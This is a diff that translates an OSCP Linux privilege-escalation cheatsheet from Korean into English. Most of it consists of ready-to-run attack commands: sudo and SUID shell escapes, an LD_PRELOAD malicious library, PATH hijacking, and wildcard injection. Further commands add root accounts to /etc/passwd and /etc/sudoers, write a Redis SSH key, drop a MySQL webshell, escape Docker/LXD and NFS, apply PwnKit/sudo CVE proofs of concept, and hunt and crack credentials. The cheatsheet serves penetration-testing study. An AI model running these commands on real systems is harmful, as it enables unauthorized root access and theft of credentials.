@@ -1,60 +1,60 @@
 ---
-title: "Linux 권한 상승 (Linux Privilege Escalation)"
+title: "Linux Privilege Escalation"
 date: 2026-06-20
 weight: 70
 draft: false
 tags: ["oscp", "cheatsheet"]
-summary: "낮은 권한에서 root까지 — 시스템 정보, SUID, cron, 서비스, 커널 취약점 순서로 확인."
+summary: "From low privilege to root: check system info, SUID, cron, services, and kernel vulnerabilities, in that order."
 ---
 
-- 출처: https://heretek.dev/oscp-cheatsheet/linux-privilege-escalation/ (Jean Romero) — 재구성
-- 변수: `$TARGET` = 공격 대상, `$KALI` = 공격자(Kali) IP
+- Source: https://heretek.dev/oscp-cheatsheet/linux-privilege-escalation/ (Jean Romero) — reconstructed
+- Variables: `$TARGET` = target host, `$KALI` = attacker (Kali) IP
 
-## 빠른 승리 순서 (Quick Win Order) — 시험 압박 속에서 위에서 아래로 읽기
+## Quick Win Order — read top to bottom under exam pressure
 
-### 30초 확인 — 모든 박스에서 가장 먼저 실행
+### 30-second checks — run first on every box
 
-- `sudo -l` — GTFOBins에 등록된 항목이 하나라도 있으면 즉시 승리 (Check 1)
-- `id` — 평범하지 않은 그룹? (docker, lxd, disk, adm, shadow)
-- SUID 전수 조사: `find / -perm -4000 -type f 2>/dev/null` (Check 2)
-- `ls -la /etc/passwd /etc/shadow` — 원래 있어서는 안 되는 쓰기/읽기 권한?
+- `sudo -l` — if any entry is listed in GTFOBins, instant win (Check 1)
+- `id` — unusual groups? (docker, lxd, disk, adm, shadow)
+- Full SUID sweep: `find / -perm -4000 -type f 2>/dev/null` (Check 2)
+- `ls -la /etc/passwd /etc/shadow` — write/read access where it shouldn't exist?
 
-### 5분 확인 — LinPEAS 시작 전에
+### 5-minute checks — before starting LinPEAS
 
-- Cron: `cat /etc/crontab`, `ls -la /etc/cron.*` — 쓰기 가능한 스크립트 또는 PATH 남용
+- Cron: `cat /etc/crontab`, `ls -la /etc/cron.*` — writable scripts or PATH abuse
 - Capabilities: `getcap -r / 2>/dev/null`
-- 내부 리스닝 포트: `ss -tulnp`
-- 파일 속 creds: `.bash_history`, `.env`, `config.php`, `wp-config.php`
+- Internal listening ports: `ss -tulnp`
+- Creds in files: `.bash_history`, `.env`, `config.php`, `wp-config.php`
 
-### 15분 확인 — LinPEAS 병렬 실행
+### 15-minute checks — run LinPEAS in parallel
 
-- `linpeas.sh` 실행 후 빨강/노랑 하이라이트부터 읽기
-- 쓰기 가능한 service unit/설정 파일, PATH 하이재킹
-- creds 재사용 — 찾은 패스워드를 root와 다른 유저에 즉시 시도
-- `uname -a` → 커널 버전 → searchsploit (더 쉬운 벡터가 없었을 때만)
+- Run `linpeas.sh` and read the red/yellow highlights first
+- Writable service unit/config files, PATH hijacking
+- Credential reuse — immediately try found passwords against root and other users
+- `uname -a` → kernel version → searchsploit (only when easier vectors didn't pan out)
 
-### 30분 이상 조사 — 시간을 잡아먹는 것들
+### 30+ minute investigations — time sinks
 
-- 커스텀 SUID 바이너리 → `ltrace`/`strace`로 주입 가능한 `system()`/상대경로 호출 확인
-- `sudo -l` env_keep에 나온 LD_PRELOAD / LD_LIBRARY_PATH 남용
-- NFS `no_root_squash`, Docker/LXD 그룹 탈출
-- 커널 익스플로잇 — 최후 수단, 박스를 크래시시킬 수 있다
+- Custom SUID binary → check `ltrace`/`strace` for injectable `system()`/relative-path calls
+- LD_PRELOAD / LD_LIBRARY_PATH abuse via `env_keep` shown in `sudo -l`
+- NFS `no_root_squash`, Docker/LXD group escape
+- Kernel exploits — last resort, they can crash the box
 
-### 특수 상황
+### Special situations
 
-- 컨테이너 안? `/.dockerenv`, capabilities, 마운트된 호스트 경로 확인
-- 제한 쉘(rbash)? `vi`, `python`, `sudo`, 또는 `ssh -t <host> bash` 로 탈출
-- 명령이 조용히 실패? 전체 경로를 쓰고 AppArmor/SELinux DENIED 로그 확인
+- Inside a container? Check `/.dockerenv`, capabilities, and mounted host paths
+- Restricted shell (rbash)? Escape with `vi`, `python`, `sudo`, or `ssh -t <host> bash`
+- Commands failing silently? Use full paths and check AppArmor/SELinux DENIED logs
 
-## Check 1 — sudo -l (항상 가장 먼저)
+## Check 1 — sudo -l (always first)
 
 ```bash
 sudo -l
 ```
 
-바이너리가 하나라도 나오면 즉시 GTFOBins 확인.
+If any binary appears, check GTFOBins immediately.
 
-자주 터지는 조합:
+Commonly hit combinations:
 
 ```bash
 sudo vim -c ':!/bin/sh'
@@ -68,11 +68,11 @@ sudo apt-get changelog apt   # drops to less → type !/bin/sh for root
 sudo /usr/bin/tee /etc/passwd < malicious_passwd  # overwrite /etc/passwd
 ```
 
-- 경고: GTFOBins sudo 익스플로잇이 의외로 실패하면 `grep apparmor /var/log/syslog` 로 DENIED 항목 확인 — AppArmor가 막고 있을 수 있다.
+- Warning: if a GTFOBins sudo exploit unexpectedly fails, check for DENIED entries with `grep apparmor /var/log/syslog` — AppArmor may be blocking it.
 
-### LD_PRELOAD 하이재킹
+### LD_PRELOAD hijacking
 
-`sudo -l`에 `env_keep+=LD_PRELOAD`가 보이면:
+If `sudo -l` shows `env_keep+=LD_PRELOAD`:
 
 ```text
 // File: /tmp/evil.c
@@ -91,11 +91,11 @@ gcc -fPIC -shared -o /tmp/evil.so /tmp/evil.c -nostartfiles
 sudo LD_PRELOAD=/tmp/evil.so <allowed_binary>
 ```
 
-### PYTHONPATH / SETENV 하이재킹
+### PYTHONPATH / SETENV hijacking
 
-`env_keep+=PYTHONPATH` 또는 `SETENV`가 있으면, sudo 허용 스크립트가 import하는 모듈과 같은 이름의 악성 파이썬 모듈을 만든다.
+If `env_keep+=PYTHONPATH` or `SETENV` is present, create a malicious Python module with the same name as a module imported by the sudo-allowed script.
 
-`sudo -l`에 `gcore`(또는 `/usr/bin/gcore`)가 보이면 권한 있는 프로세스 메모리를 덤프해 평문 creds을 얻는다:
+If `gcore` (or `/usr/bin/gcore`) appears in `sudo -l`, dump the memory of a privileged process to get plaintext creds:
 
 ```bash
 ps -ef | grep -E 'root|sshd|mysql'   # find a juicy PID
@@ -103,16 +103,16 @@ sudo gcore -o /tmp/dump <PID>
 strings /tmp/dump.<PID> | grep -iE 'password|passwd|secret|token' | sort -u
 ```
 
-## Check 2 — SUID 바이너리
+## Check 2 — SUID binaries
 
 ```bash
 find / -perm -u=s -type f 2>/dev/null
 find / -perm -g=s -type f 2>/dev/null    # also check SGID
 ```
 
-결과는 전부 GTFOBins과 대조. 악용 가능한 대표 바이너리: `find`, `vim`, `python`, `bash` (`bash -p`), `nmap`, `cp`, `env`, `gdb`, `systemctl`, `base64`, `openssl`, `wget`.
+Compare all results against GTFOBins. Representative binaries you can abuse: `find`, `vim`, `python`, `bash` (`bash -p`), `nmap`, `cp`, `env`, `gdb`, `systemctl`, `base64`, `openssl`, `wget`.
 
-빠른 SUID 악용 예시:
+Quick SUID abuse examples:
 
 ```bash
 # SUID find
@@ -125,18 +125,18 @@ echo 'root2:$(openssl passwd w00t):0:0:root:/root:/bin/bash' >> /tmp/passwd.bak
 cp /tmp/passwd.bak /etc/passwd
 ```
 
-### 커스텀 SUID 바이너리 → PATH 하이재킹
+### Custom SUID binary → PATH hijacking
 
-GTFOBins에 없는 SUID 바이너리면 무엇을 호출하는지 조사한다:
+If the SUID binary is not in GTFOBins, find out what it calls:
 
 ```bash
 file ./mystery_binary
 strings ./mystery_binary | grep -E '^/|system|exec|popen'
 ```
 
-`strings`에서 슬래시 없는 맨 명령(`chpasswd`, `ping`, `service`, `cat`)이 보이면 그 명령을 `$PATH` 검색으로 호출한다는 뜻. PATH 하이재킹이 통한다.
+If `strings` shows bare commands without a slash (`chpasswd`, `ping`, `service`, `cat`), the binary calls them through a `$PATH` lookup. PATH hijacking works.
 
-`strings`가 `echo kiero:kiero | chpasswd`를 보여준 사례 — `chpasswd`가 `/usr/sbin/` 접두사 없이 호출됨.
+Example where `strings` showed `echo kiero:kiero | chpasswd` — `chpasswd` was called without the `/usr/sbin/` prefix.
 
 ```bash
 # 1. Create fake binary matching the bare name
@@ -155,19 +155,19 @@ export PATH=/tmp:$PATH
 # whoami → root
 ```
 
-핵심 모델: SUID 바이너리 + 상대경로 명령 + 쓰기 가능 디렉터리 = root.
+Core model: SUID binary + relative-path command + writable directory = root.
 
-- SUID 비트가 바이너리를 root로 실행시킨다
-- `system()` / `execvp()`는 맨 명령을 `$PATH`에서 찾는다
-- `$PATH`를 내가 통제하므로 어떤 바이너리가 먼저 잡히는지도 내가 결정한다
+- The SUID bit makes the binary run as root
+- `system()` / `execvp()` look up bare commands in `$PATH`
+- You control `$PATH`, so you decide which binary gets picked up first
 
-같은 트릭의 변형:
+Variations of the same trick:
 
-- cron이 맨 명령을 호출 → 같은 PATH 하이재킹 (트리거만 다름)
-- 서비스 스크립트가 맨 명령을 호출 → 같은 PATH 하이재킹
-- `env_keep += "PATH"` 가 설정된 sudo → sudo 바이너리 경유로 같은 PATH 하이재킹
+- A cron job calls a bare command → same PATH hijack (only the trigger differs)
+- A service script calls a bare command → same PATH hijack
+- `sudo` with `env_keep += "PATH"` → same PATH hijack through the sudo binary
 
-## Check 3 — Cron 작업과 타이머
+## Check 3 — Cron jobs and timers
 
 ```bash
 cat /etc/crontab
@@ -183,7 +183,7 @@ grep "CRON" /var/log/syslog 2>/dev/null
 grep "CRON" /var/log/cron.log 2>/dev/null
 ```
 
-숨은 root cron을 잡으려면 pspy64 실행:
+To catch hidden root cron jobs, run pspy64:
 
 ```bash
 chmod +x pspy64 && ./pspy64
@@ -207,27 +207,27 @@ ln -s /etc/shadow shadowcopy
 ln -s /root/proof.txt rootproof
 ```
 
-root로 도는 cron을 찾았을 때 확인 목록:
+Checklist when you find a cron job running as root:
 
-- 쓰기 가능한 스크립트? → 내용을 리버스 쉘로 교체
-- 쓰기 가능한 디렉터리에서 `*` 사용? → 와일드카드 인젝션 (아래)
-- 절대경로 없이 명령 호출? → PATH 하이재킹
-- 파이썬 모듈 import? → 라이브러리 하이재킹
-- bash 파일 source? → 소스 파일 하이재킹
-- 하드코딩된 creds? → creds 재사용
+- Writable script? → replace its contents with a reverse shell
+- Uses `*` in a writable directory? → wildcard injection (below)
+- Calls commands without absolute paths? → PATH hijacking
+- Imports Python modules? → library hijacking
+- Sources a bash file? → sourced-file hijacking
+- Hardcoded creds? → credential reuse
 
-### RED FLAGS — `cat /etc/cron.d/*` 후 5초 스캔
+### RED FLAGS — 5-second scan after `cat /etc/cron.d/*`
 
-훑지 말고 모든 줄을 읽는다. 아래 중 하나라도 보이면 멈추고 악용한다:
+Don't skim. Read every line. If any of the following appear, stop and exploit:
 
-- 줄 끝이 맨 `*` → 와일드카드 인젝션 (중요). 예: `cd /opt/admin && tar -zxf backup.tar.gz *`
-- `/opt/`, `/home/`, `/tmp/`, `/var/www/` 아래 경로 → 쓰기 가능 여부 확인. 예: `cd /opt/admin && ...` → `ls -la /opt/admin`
-- `tar` / `rsync` / `chown` / `7z` / `zip` / `find` + 경로 → 와일드카드 인젝션 (중요). 위 명령어 + `*` 조합이면 된다
-- 맨 명령(`/usr/bin/` 접두사 없음) → PATH 하이재킹 (중요). 예: `* * * * * root cleanup.sh`
-- `.sh` 스크립트 → 스크립트와 부모 디렉터리 양쪽의 쓰기 가능 확인. 예: `bash /opt/scripts/x.sh`
-- `python` / `perl` / `php` 스크립트 → 모듈/라이브러리 하이재킹 확인. 예: `python /opt/app/main.py`
+- Line ends with a bare `*` → wildcard injection (important). Example: `cd /opt/admin && tar -zxf backup.tar.gz *`
+- Paths under `/opt/`, `/home/`, `/tmp/`, `/var/www/` → check writability. Example: `cd /opt/admin && ...` → `ls -la /opt/admin`
+- `tar` / `rsync` / `chown` / `7z` / `zip` / `find` + a path → wildcard injection (important). Any of those commands combined with `*`
+- Bare command (no `/usr/bin/` prefix) → PATH hijacking (important). Example: `* * * * * root cleanup.sh`
+- `.sh` script → check writability of both the script and its parent directory. Example: `bash /opt/scripts/x.sh`
+- `python` / `perl` / `php` script → check for module/library hijacking. Example: `python /opt/app/main.py`
 
-root cron/스크립트가 쓰기 가능한 디렉터리에서 `tar`, `rsync`, `chown`, `7z` 등을 `*`와 함께 실행한다면:
+If a root cron/script runs `tar`, `rsync`, `chown`, `7z`, etc. with `*` in a writable directory:
 
 ```bash
 # tar — files starting with `--` are interpreted as flags
@@ -246,7 +246,7 @@ touch -- '@x.txt' && ln -s /etc/shadow x.txt
 # `7z a backup.7z *` → /etc/shadow content leaked
 ```
 
-- 핵심 모델: `*`로 확장된 파일명을 플래그로 파싱하는 바이너리는 전부 취약. 악성 플래그를 "이름"으로 갖는 파일을 떨어뜨린다.
+- Core model: any binary that parses wildcard-expanded filenames as flags is vulnerable. Drop files whose names are malicious flags.
 
 ## Check 4 — Capabilities
 
@@ -254,13 +254,13 @@ touch -- '@x.txt' && ln -s /etc/shadow x.txt
 getcap -r / 2>/dev/null
 ```
 
-출력 읽는 법: `/usr/bin/perl = cap_setuid+ep`
+How to read the output: `/usr/bin/perl = cap_setuid+ep`
 
-- `=` 왼쪽 → 바이너리 이름 (GTFOBins의 Capabilities 섹션에서 검색)
-- `=` 와 `+` 사이 → capability (부여된 권한)
-- 플래그에 `e`(effective)가 포함되어야 악용 가능 — `+ep` 또는 `+eip`는 살아있고, `+i`만이면 휴면 상태라 건너뛴다
+- Left of `=` → binary name (search the Capabilities section of GTFOBins)
+- Between `=` and `+` → capability (granted privilege)
+- The flags must include `e` (effective) to be exploitable — `+ep` or `+eip` is live; `+i` alone is dormant, so skip it
 
-인터프리터에 `cap_setuid+ep`가 있으면 즉시 root:
+If an interpreter has `cap_setuid+ep`, you get root immediately:
 
 ```bash
 python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
@@ -268,42 +268,42 @@ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
 node -e 'process.setuid(0); require("child_process").spawn("/bin/bash",{stdio:[0,1,2]})'
 ```
 
-capability별 영향:
+Impact by capability:
 
-- `cap_setuid+ep` — 인터프리터로 root 전환 (위 명령)
-- `cap_dac_read_search+ep` — 임의 파일 읽기 (`/etc/shadow`, `/root/.ssh/id_rsa` 포함)
-- `cap_dac_override+ep` — 임의 파일 읽고 쓰기 (`/etc/passwd`, `/etc/sudoers` 교체)
-- `cap_chown+ep` — 임의 파일 소유권 변경 → /etc/passwd 장악
-- `cap_sys_admin+ep` — 파일시스템 마운트 (디스크 마운트, chroot 탈출)
-- `cap_net_raw+ep` — raw 소켓 (네트워크 스니핑, ARP)
-- `cap_sys_ptrace+ep` — 임의 프로세스 인젝션 (root 프로세스 탈취)
-- `cap_sys_module+ep` — 커널 모듈 로드
+- `cap_setuid+ep` — switch to root via an interpreter (commands above)
+- `cap_dac_read_search+ep` — read arbitrary files (including `/etc/shadow`, `/root/.ssh/id_rsa`)
+- `cap_dac_override+ep` — read and write arbitrary files (replace `/etc/passwd`, `/etc/sudoers`)
+- `cap_chown+ep` — change ownership of arbitrary files → take over `/etc/passwd`
+- `cap_sys_admin+ep` — mount filesystems (mount disks, chroot escape)
+- `cap_net_raw+ep` — raw sockets (network sniffing, ARP)
+- `cap_sys_ptrace+ep` — inject into arbitrary processes (hijack root processes)
+- `cap_sys_module+ep` — load kernel modules
 
-## Check 5 — 자동 열거 (LinPEAS 등)
+## Check 5 — Automated enumeration (LinPEAS, etc.)
 
 ```bash
 ./linpeas.sh | tee linpeas_output.txt
 ```
 
-RED/YELLOW 발견은 거의 확실한 privesc 벡터다.
+RED/YELLOW findings are almost always real privesc vectors.
 
-대체 도구 (linpeas가 AV에 막히거나 없을 때):
+Alternative tools (when linpeas is blocked by AV or unavailable):
 
 ```bash
 unix-privesc-check standard > output.txt   # pre-installed on Kali, transfer to target
 # Also: LinEnum.sh, linux-exploit-suggester.sh
 ```
 
-linpeas가 놓칠 수 있는 수동 확인:
+Manual checks that linpeas may miss:
 
 ```bash
 # World-writable directories (check for cron scripts, service binaries in these)
 find / -writable -type d 2>/dev/null
 ```
 
-## Check 6 — 패스워드 헌팅
+## Check 6 — Password hunting
 
-### 환경 변수와 dotfile (가장 먼저 — 비용 가장 낮음)
+### Environment variables and dotfiles (do this first — lowest cost)
 
 ```bash
 # Env vars may contain hardcoded creds set by admins
@@ -314,7 +314,7 @@ cat ~/.bashrc | grep -i 'export\|pass\|cred\|secret'
 cat /home/*/.bashrc 2>/dev/null | grep -i 'export\|pass'
 ```
 
-### 실행 중인 프로세스에서 creds 스니핑
+### Sniffing creds from running processes
 
 ```bash
 # Watch for transient processes leaking passwords in command-line args
@@ -323,7 +323,7 @@ watch -n 1 "ps aux | grep pass"
 # pspy is better for this — but watch works without transferring tools
 ```
 
-### grep 기반 creds 검색
+### grep-based creds search
 
 ```bash
 grep -ri 'password' /var/www/ /etc/ /opt/ /home/ 2>/dev/null
@@ -333,9 +333,9 @@ cat /home/*/.bash_history
 cat /root/.bash_history 2>/dev/null
 ```
 
-### 노이즈 감소 (기본 검색이 너무 많이 나올 때)
+### Reducing noise (when default searches return too much)
 
-위 grep은 소방호스다. `/etc/`나 `/var/www/`가 수천 건으로 범람하면(locales, manpage, doc string, 패키지 메타데이터) 대신 이것들:
+The grep above is a firehose. If `/etc/` or `/var/www/` floods with thousands of hits (locales, manpages, doc strings, package metadata), use these instead:
 
 ```bash
 # 1. Filenames only first — triage, then read selectively
@@ -357,9 +357,9 @@ grep -ri 'password' /etc/ 2>/dev/null | grep -vE '/locale/|/man/|\.gz:'
 grep -ri 'password' /etc/ 2>/dev/null | wc -l   # >500? tighten the query
 ```
 
-우선순위: 파일명만 (#1) → 정규식 강화 (#2) → 확장자 범위 (#3) → 상위 결과 읽기.
+Priority: filenames only (#1) → tighter regex (#2) → file-extension scope (#3) → read the top results.
 
-### Git 저장소 (삭제된 creds은 커밋 히스토리에 남는다)
+### Git repositories (deleted creds remain in commit history)
 
 ```bash
 # Find .git directories
@@ -373,7 +373,7 @@ git log -p                                 # all diffs in full
 git log --all --oneline                    # compact view
 ```
 
-자주 cred이 나오는 위치:
+Locations where creds often show up:
 
 ```bash
 cat /var/www/html/wp-config.php
@@ -383,9 +383,9 @@ find / -name "*.config" -o -name "*.conf" -o -name "*.cfg" -o -name "*.ini" -o -
 find / -name "*.bak" -o -name "*.old" -o -name "*.backup" 2>/dev/null
 ```
 
-### 보호된 파일 크랙
+### Cracking protected files
 
-패스워드로 보호된 파일을 찾으면 크랙한다. 누군가 보호했다면 내용이 중요하다는 뜻.
+If you find a password-protected file, crack it. If someone protected it, the contents matter.
 
 ```bash
 # The *2john family converts any format to john-crackable hash
@@ -400,7 +400,7 @@ office2john file.docx > hash.txt
 john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
-## Check 7 — SSH 키
+## Check 7 — SSH keys
 
 ```bash
 find / -name id_rsa -o -name id_dsa -o -name id_ecdsa -o -name id_ed25519 -o -name "*.pem" 2>/dev/null
@@ -408,13 +408,13 @@ cat /home/*/.ssh/authorized_keys 2>/dev/null
 cat /root/.ssh/id_rsa 2>/dev/null
 ```
 
-## Check 8 — 쓰기 가능한 /etc/passwd, /etc/shadow, /etc/sudoers
+## Check 8 — Writable /etc/passwd, /etc/shadow, /etc/sudoers
 
 ```bash
 ls -la /etc/passwd /etc/shadow /etc/sudoers /etc/sudoers.d/
 ```
 
-/etc/passwd 쓰기 가능:
+Writable /etc/passwd:
 
 ```bash
 openssl passwd -1 password123
@@ -422,7 +422,7 @@ echo 'hacker:$1$xyz$abc...:0:0:root:/root:/bin/bash' >> /etc/passwd
 su hacker    # password: password123
 ```
 
-/etc/sudoers 또는 /etc/sudoers.d/ 쓰기 가능 (실전에서는 passwd보다 흔함):
+Writable /etc/sudoers or /etc/sudoers.d/ (more common in practice than passwd):
 
 ```bash
 echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
@@ -431,7 +431,7 @@ sudo -i   # root
 echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/zz_pwn
 ```
 
-/etc/shadow 쓰기 가능:
+Writable /etc/shadow:
 
 ```bash
 # Replace root's hash with a known one
@@ -439,18 +439,18 @@ openssl passwd -6 toor   # → $6$...
 # Edit /etc/shadow, replace root's $6$... with yours, then `su root` with toor
 ```
 
-## Check 9 — 내부 서비스
+## Check 9 — Internal services
 
 ```bash
 ss -tulnp
 netstat -tulnp 2>/dev/null
 ```
 
-`127.0.0.1`에 바인딩된 서비스를 찾는다 — 외부 nmap에는 안 보인다.
+Look for services bound to `127.0.0.1` — they don't show up in an external nmap.
 
-자주 나오는 것: MySQL 3306 (`mysql -u root` 시도), Redis 6379, 고 포트의 내부 웹 앱, dev 서버.
+Commonly seen: MySQL on 3306 (try `mysql -u root`), Redis on 6379, internal web apps on high ports, dev servers.
 
-악용을 위해 포트 포워딩:
+Port forwarding to reach them:
 
 ```bash
 # Basic: forward target localhost:8080 to YOUR localhost:8080
@@ -467,13 +467,13 @@ ssh -i id_key user@target -p PORT -L 8080:127.0.0.1:8080 -L 3306:127.0.0.1:3306 
 # Then browse http://127.0.0.1:8080 on Kali to access the service
 ```
 
-터졌을 때 정석 대응 (한 줄 기억용):
+Standard responses when you hit these (one-line reminders):
 
 - Redis (6379) → `CONFIG SET dir /root/.ssh/` + `dbfilename authorized_keys` + `SET x "ssh-rsa..."` + `SAVE`
-- MySQL root + 쓰기 가능 웹루트 → `SELECT '<?php ... ?>' INTO OUTFILE '/var/www/html/x.php'`
-- Docker socket 읽기 가능 → `/` 를 마운트하고 chroot (docker 그룹과 같은 페이로드, Check 11)
-- Werkzeug/Flask debug → 파이썬 REPL 그 자체: `__import__('os').system('id')`
-- 그 외 → 그 서비스 설정을 박스에서 검색 (`/etc/<svc>/*`) — creds이 보통 거기 있다
+- MySQL root + writable webroot → `SELECT '<?php ... ?>' INTO OUTFILE '/var/www/html/x.php'`
+- Docker socket readable → mount `/` and chroot (same payload as the docker group, Check 11)
+- Werkzeug/Flask debug → the Python REPL itself: `__import__('os').system('id')`
+- Otherwise → search that service's config on the box (`/etc/<svc>/*`) — creds are usually there
 
 ## Check 10 — NFS no_root_squash
 
@@ -486,7 +486,7 @@ cat /etc/exports
 # Look for: /share *(rw,no_root_squash)
 ```
 
-발견하면:
+If found:
 
 ```bash
 # On attacker (as root):
@@ -497,30 +497,30 @@ sudo chmod +s /tmp/nfs/bash
 /share/bash -p
 ```
 
-## Check 11 — 권한 그룹 (Docker / LXD / disk / adm / shadow)
+## Check 11 — Privileged groups (Docker / LXD / disk / adm / shadow)
 
 ```bash
 id
 # Look for: docker, lxd, lxc, disk, adm, shadow, kvm, sudo, wheel, video
 ```
 
-그룹별 root 경로:
+Root path per group:
 
 - `docker` — `docker run -v /:/mnt --rm -it alpine chroot /mnt sh`
-- `lxd` / `lxc` — 아래 LXD 블록 참조
-- `adm` — `/var/log/*` 읽기 (auth.log, syslog가 sudo/sshpass creds을 새는 경우가 많다)
-- `shadow` — `/etc/shadow` 읽기 → `unshadow` + john으로 오프라인 크랙
-- `video` — 프레임버퍼 `/dev/fb0` 읽기 — 활성 GUI 세션이 있을 때만 유용
-- `kvm` — `/dev/kvm` 접근 — 디스크 이미지 마운트와 조합
-- `sudo` / `wheel` — `sudo -l` (Check 1에서 이미 커버)
+- `lxd` / `lxc` — see the LXD block below
+- `adm` — read `/var/log/*` (auth.log and syslog often leak sudo/sshpass creds)
+- `shadow` — read `/etc/shadow` → `unshadow` + john for offline cracking
+- `video` — read the framebuffer `/dev/fb0` — only useful when an active GUI session exists
+- `kvm` — `/dev/kvm` access — combine with disk image mounting
+- `sudo` / `wheel` — `sudo -l` (already covered in Check 1)
 
-Docker 탈출:
+Docker escape:
 
 ```bash
 docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 ```
 
-LXD 탈출:
+LXD escape:
 
 ```bash
 lxc image import ./alpine.tar.gz --alias myimage
@@ -530,7 +530,7 @@ lxc start mycontainer
 lxc exec mycontainer /bin/sh
 ```
 
-disk 그룹 — 블록 디바이스 raw 읽기 (debugfs):
+disk group — raw block device reads (debugfs):
 
 ```bash
 # debugfs gives raw filesystem read on the block device
@@ -541,18 +541,18 @@ debugfs:  quit
 chmod 600 /tmp/rootkey && ssh -i /tmp/rootkey root@127.0.0.1
 ```
 
-목록에 없는 그룹 분류:
+Classifying groups not on the list:
 
 ```bash
 getent group <name>          # who else is in it, hints at purpose
 find / -group <name> -ls 2>/dev/null | head -20   # what files it owns
 ```
 
-`/etc/`의 설정, `/usr/sbin/`의 바이너리, `/var/log/`의 로그, `/dev/`의 디바이스를 본다. 15분 동안 쓸 게 없으면 버린다 — privesc 벡터가 아니다.
+Look at configs in `/etc/`, binaries in `/usr/sbin/`, logs in `/var/log/`, and devices in `/dev/`. If nothing is usable after 15 minutes, drop it — it's not a privesc vector.
 
-## Check 12a — 유저영역 SUID/sudo CVE (초반에 시도해도 안전)
+## Check 12a — Userland SUID/sudo CVEs (safe to try early)
 
-커널이 아니라 SUID 바이너리나 sudo를 악용하므로 박스를 크래시시키지 않는다. 커널 익스플로잇보다 먼저 시도.
+These abuse an SUID binary or sudo rather than the kernel, so they won't crash the box. Try them before kernel exploits.
 
 ```bash
 # PwnKit (CVE-2021-4034) — pkexec SUID, ~Ubuntu/Debian/CentOS 2014–early 2022
@@ -575,9 +575,9 @@ EDITOR='vim -- /etc/sudoers' sudoedit /allowed/file
 ./looney                              # less common on OSCP labs, more on modern infra
 ```
 
-- 팁: Kali에서 `searchsploit pwnkit` / `searchsploit CVE-2021-3156` 로 빠르게 확인. 프리빌드 POC는 컴파일 없이 대부분의 OSCP 세대 타깃에서 동작한다.
+- Tip: check quickly on Kali with `searchsploit pwnkit` / `searchsploit CVE-2021-3156`. Prebuilt PoCs work on most OSCP-generation targets without compiling.
 
-## Check 12b — 커널 익스플로잇 (최후 수단)
+## Check 12b — Kernel exploits (last resort)
 
 ```bash
 uname -a
@@ -586,40 +586,40 @@ cat /etc/os-release
 # Then on Kali: searchsploit "linux kernel <version> Local Privilege Escalation"
 ```
 
-uname 출력 읽는 법: `5.4.0-42-generic #46-Ubuntu SMP Fri Jul 10 ... 2020 x86_64`
+How to read uname output: `5.4.0-42-generic #46-Ubuntu SMP Fri Jul 10 ... 2020 x86_64`
 
-- `5.4.0-42-generic` → 업스트림 커널 + 배포판 패치 레벨 (`-42`) + 플레이버
-- `#46-Ubuntu ... Fri Jul 10 2020` → 빌드 날짜가 기준선: 이 날짜 이후 공개된 CVE만 적용 가능 (중요)
-- `x86_64` → 아키텍처 (컴파일한 익스플로잇이 맞아야 한다)
+- `5.4.0-42-generic` → upstream kernel + distro patch level (`-42`) + flavor
+- `#46-Ubuntu ... Fri Jul 10 2020` → the build date is the baseline: only CVEs published after this date can apply (important)
+- `x86_64` → architecture (your compiled exploit must match)
 
-`/etc/os-release`(배포판 + 릴리스)와 조합해 전체 식별자를 만든다.
+Combine `/etc/os-release` (distro + release) with the above to build the full identifier.
 
-조회 쿼리 템플릿: `<distro> <release> <kernel> privilege escalation`
-예: `ubuntu 20.04 5.4.0-42 privilege escalation`
+Lookup query template: `<distro> <release> <kernel> privilege escalation`
+e.g. `ubuntu 20.04 5.4.0-42 privilege escalation`
 
-linux-exploit-suggester.sh 사용:
+Using linux-exploit-suggester.sh:
 
 ```bash
 ./linux-exploit-suggester.sh              # reads uname automatically
 ./linux-exploit-suggester.sh -k 5.4.0-42  # force a specific kernel string
 ```
 
-CVE 목록이 아니라 Exposure 태그를 읽는다:
+Read the Exposure tags, not the CVE list:
 
-- `highly probable` / `probable` → 시도
-- `less probable` / `unprobable` → 건너뜀
+- `highly probable` / `probable` → try it
+- `less probable` / `unprobable` → skip
 
-컴파일 전 교차 확인: `<CVE> <distro> <release> patched` 로 검색 — 타깃 빌드 날짜에 패치가 배포되지 않았음을 확인.
+Cross-check before compiling: search `<CVE> <distro> <release> patched` — confirm the patch was not shipped in the target's build date.
 
-linux-exploit-suggester.sh 의 주요 커널 익스플로잇:
+Major kernel exploits in linux-exploit-suggester.sh:
 
 - DirtyPipe (CVE-2022-0847) — Linux 5.8 – 5.16.11, 5.15.25, 5.10.102
-- DirtyCow (CVE-2016-5195) — 구형 커널 (< 4.8.3)
-- OverlayFS (CVE-2021-3493 / CVE-2023-0386) — Ubuntu 전용
+- DirtyCow (CVE-2016-5195) — older kernels (< 4.8.3)
+- OverlayFS (CVE-2021-3493 / CVE-2023-0386) — Ubuntu only
 
-- 경고: 커널 익스플로잇은 박스를 크래시시킬 수 있다. Check 12a를 먼저 다 쓴다.
+- Warning: kernel exploits can crash the box. Exhaust Check 12a first.
 
-## Checks 13-18 — 추가 벡터
+## Checks 13-18 — Additional vectors
 
 ```bash
 # 13. World-writable files
@@ -651,7 +651,7 @@ echo "/tmp/evil.so" > /etc/ld.so.preload
 sudo /usr/bin/find . -exec /bin/bash -p \;   # any SUID/sudo call triggers it
 ```
 
-쓰기 가능한 systemd 서비스 악용:
+Abusing a writable systemd service:
 
 ```bash
 # Find any writable .service file root manages
@@ -670,31 +670,31 @@ sudo reboot
 /tmp/rb -p   # root
 ```
 
-## 자동 도구가 아무것도 못 찾을 때
+## When automated tools find nothing
 
-LinPEAS, sudo -l, SUID, cron이 전부 비었을 때:
+When LinPEAS, sudo -l, SUID, and cron all come up empty:
 
-1. 파일시스템 루트에서 비기본 디렉터리 확인 — `ls /` 로 `/opt/`, `/srv/`, `/backup/`, 커스텀 디렉터리 등 평범하지 않은 것을 찾는다. 거기 일부러 놓인 것에는 이유가 있다.
-2. 접근 가능한 모든 파일 읽기 — 홈 디렉터리, 웹 루트, 설정 파일이 특히. 패스워드 보호 파일은 고가치 (크랙한다).
